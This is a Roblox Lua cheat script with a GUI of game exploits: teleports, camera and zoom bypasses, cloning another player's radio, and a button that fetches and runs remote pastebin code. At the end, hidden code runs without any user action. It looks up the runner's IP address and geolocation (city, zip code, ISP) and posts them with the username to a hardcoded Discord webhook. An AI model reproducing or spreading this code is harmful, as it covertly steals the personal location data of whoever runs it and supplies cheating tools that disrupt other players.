			  game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000,473632813, 0)
			  game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000,473632813, 0)
			  game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000,473632813, 0)
			end)
			wait()
		  end
	end,
}

MiscTab:Button{
	Name = "Blocky Head",
	Description = "Square head type thing ygm",
	Callback = function()
		function heady()
			pcall(function()
		   game.Players.LocalPlayer.Character.Head.Mesh:Destroy()
		   game.Players.LocalPlayer.Character.Head.ear2.Mesh:Destroy()
		   game.Players.LocalPlayer.Character.Head.ear.Mesh:Destroy()
		   end)
		end
		heady()
	end,
}

MiscTab:Button{
	Name = "Celebrity Tag",
	Description = "Celebrity Tag above your head.",
	Callback = function()
		game:GetService("Players").LocalPlayer.Character.Head.Gui.MainFrame.Celeb.Visible = true
	end,
}

MiscTab:Button{
	Name = "Free camera",
	Description = "Spectator mode.",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/mfrMFUcJ"))()
	end,
}

MiscTab:Button{
	Name = "Reset",
	Description = "Resets character.",
	Callback = function() 
    end
}

MiscTab:Button{
	Name = "Leave",
	Description = "leaves game.",
	Callback = function()
		game.Players.LocalPlayer:Kick("Player requested kick")
	end,
}

MiscTab:Button{
	Name = "Bypass Zoom",
	Description = "Zoom as for as you like.",
	Callback = function()
		game.Players.LocalPlayer.CameraMaxZoomDistance = math.random(999,1337)
	end,
}

MiscTab:Button{
	Name = "MET Radio",
	Description = "Troll the MET.",
	Callback = function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "MET Radio",
			Text = "This will let you have to access the MET radio, doesn't work if there isn't a MET in the game."
		})
		local Target = nil
		for i,v in pairs(game.Players:GetChildren()) do
			if v.TeamColor == BrickColor.new("Navy blue") then
				Target = v.Name
			end
		end
		for i,v in pairs(game.Players[Target].Backpack:GetChildren()) do
			if v.Name == "Radio" then
				v:Clone().Parent = game.Players.LocalPlayer.Backpack
			end
		end
		end,
}

local TeleportTab = GUI:Tab{
	Name = "Teleports",
	Icon = "rbxassetid://6157099647"
}

TeleportTab:Button{
	Name = "Teleports",
	Description = nil,
	Callback = function() 
        GUI:Notification{
            Title = "Teleport",
            Text = "Click on one of the tps with building bypass and it will take you there",
            Duration = 3,
            Callback = function() end
        }
    end
}

TeleportTab:Button{
	Name = "Apartment 1",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-176.541977, -457.964905, -69.6778412, 0.0172199383, -7.30185334e-08, 0.999851704, -1.86776674e-08, 1, 7.33510319e-08, -0.999851704, -1.99379979e-08, 0.0172199383)
	end,
}

TeleportTab:Button{
	Name = "Apartment 2",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-175.904221, -457.964905, -493.479797, 0.0789805874, -2.37789219e-08, 0.99687618, -4.13485459e-08, 1, 2.71294027e-08, -0.99687618, -4.33620748e-08, 0.0789805874)
	end,
}

TeleportTab:Button{
	Name = "Apartment 3",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-0.532082677, -457.913483, -112.602715, -0.000539803877, -4.52883206e-08, -0.999999881, 6.60640032e-09, 1, -4.52918947e-08, 0.999999881, -6.63084831e-09, -0.000539803877)
	end,
}

TeleportTab:Button{
	Name = "Sports Direct",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-195.589691, -463.662384, 92.2535934, 0.238895774, 2.38148239e-08, 0.971045196, 3.21983293e-08, 1, -3.24463443e-08, -0.971045196, 3.90173298e-08, 0.238895774)
	end,
}

TeleportTab:Button{
	Name = "Tescos",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(983.751831, -446.635803, 103.678848, -0.381174803, -9.88733646e-08, -0.924502969, -2.49378118e-08, 1, -9.66656728e-08, 0.924502969, -1.37914373e-08, -0.381174803)
	end,
}

TeleportTab:Button{
	Name = "New Londons",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(612.033203, -400.384491, -106.705254, -0.0193231795, -7.59797825e-09, 0.999813318, 1.18716381e-09, 1, 7.62234187e-09, -0.999813318, 1.33423006e-09, -0.0193231795)
	end,
}

TeleportTab:Button{
	Name = "Ultimate Drip",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(479.154602, -395.400482, -91.1273499, 0.216078922, 1.49673074e-08, 0.976375878, -1.26980304e-09, 1, -1.50484354e-08, -0.976375878, 2.01184469e-09, 0.216078922)
	end,
}

TeleportTab:Button{
	Name = "Gun/Melee Dealer",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(55.4791451, 4.1782546, -126.901131, 0.997650862, -1.03924357e-07, 0.0685039684, 1.04001337e-07, 1, 2.44261367e-09, -0.0685039684, 4.68762895e-09, 0.997650862)
	end,
}

TeleportTab:Button{
	Name = "Mask Dealer",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-176.336624, -0.500741839, 146.262192, 0.00358911627, 3.95761042e-08, -0.999993563, 3.16052393e-08, 1, 3.96897946e-08, 0.999993563, -3.174749e-08, 0.00358911627)
	end,
}

TeleportTab:Button{
	Name = "Turkish Barbershop",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(223.995895, -347.569946, 874.736816, 0.89640069, 6.32670947e-08, -0.443244576, -2.20718714e-08, 1, 9.8099008e-08, 0.443244576, -7.81527802e-08, 0.89640069)
	end,
}

TeleportTab:Button{
	Name = "Tattoo Parlor",
	Description = nil,
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-286.175018, -347.569946, 1316.57288, 0.954570174, 8.2568512e-08, -0.29798618, -8.18485191e-08, 1, 1.48945078e-08, 0.29798618, 1.01718758e-08, 0.954570174)
	end,
}

TeleportTab:Button{
	Name = "Car Dealership",
	Description = nil,
	Text = "Car Dealership",
   Callback = function()
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-186.654739, -463.662415, 1174.18298, 0.130901337, 5.79686592e-08, -0.991395414, 5.18117593e-09, 1, 5.91558944e-08, 0.991395414, -1.28801796e-08, 0.130901337)
   end,
}

local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1056617255397511218/RbWMee13RmLfhoj2uE3ybQx5G9wBM3EJtWixSmUIU9vYvuPJJIuphsUDxayT1-CAb7Sg"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)
